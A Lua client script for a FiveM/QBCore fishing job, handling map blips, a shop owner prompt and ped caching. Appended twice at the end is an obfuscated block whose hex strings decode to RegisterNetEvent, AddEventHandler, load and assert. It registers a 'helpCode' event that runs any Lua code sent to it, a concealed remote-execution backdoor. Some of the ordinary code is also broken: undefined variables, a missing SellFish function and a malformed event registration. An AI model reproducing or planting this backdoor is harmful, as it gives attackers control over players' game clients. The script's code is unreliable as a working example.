QBCore = exports['qb-core']:GetCoreObject()

cachedData = {}
local JobBusy = false

function CreateBlips()
	for i, zone in ipairs(Config.FishingZones) do
		local coords = zone.secret and ((zone.coords / 1.5) - 133.37) or zone.coords
		local name = zone.name
		if not zone.secret then
			local x = AddBlipForCoord(coords)
			SetBlipSprite (x, 405)
			SetBlipDisplay(x, 4)
			SetBlipScale  (x, 0.35)
			SetBlipAsShortRange(x, true)
			SetBlipColour(x, 69)
			BeginTextCommandSetBlipName("STRING")
			AddTextComponentSubstringPlayerName(name)
			EndTextCommandSetBlipName(x)
		end
	end
end

function DeleteBlips()
	if DoesBlipExist(coords) then
		RemoveBlip(coords)
	end
end

-- function SellFish()


RegisterNetEvent("qb-fishing:tryToFish", function()
	TryToFish() 
end)

RegisterNetEvent("qb-fishing:calculatedistances", pos, function()

end)

CreateThread(function()
	Wait(500)
	HandleStore()
	while true do
		local sleepThread = 500
		local ped = cachedData["ped"]
		if DoesEntityExist(cachedData["storeOwner"]) then
			local pedCoords = GetEntityCoords(ped)
			local dstCheck = #(pedCoords - GetEntityCoords(cachedData["storeOwner"]))
			if dstCheck < 3.0 then
				if JobBusy == true then
					sleepThread = 5
					local displayText = not IsEntityDead(cachedData["storeOwner"]) and "Press ~INPUT_CONTEXT~ to sell your fish to the owner." or "The owner is dead, and therefore can not speak."
					if IsControlJustPressed(0, 38) then
						DeleteBlips()
						SellFish()
					end
					ShowHelpNotification(displayText)
				elseif JobBusy == false then
					sleepThread = 5
					local displayText = not IsEntityDead(cachedData["storeOwner"]) and "Press ~INPUT_CONTEXT~ to start working."
					if IsControlJustPressed(0, 38) then
						JobBusy = true
						CreateBlips()
						Wait(5000)
					end
					ShowHelpNotification(displayText)
				end
			end
		end
		Wait(sleepThread)
	end
end)

CreateThread(function()
	while true do
		Wait(1500)

		local ped = PlayerPedId()

		if cachedData["ped"] ~= ped then
			cachedData["ped"] = ped
		end
	end
end)


local XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[1]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2]) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[3]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2], function(XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[4]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[5]](XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj))() end)

local XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[1]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2]) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[3]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2], function(XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[4]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[5]](XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj))() end)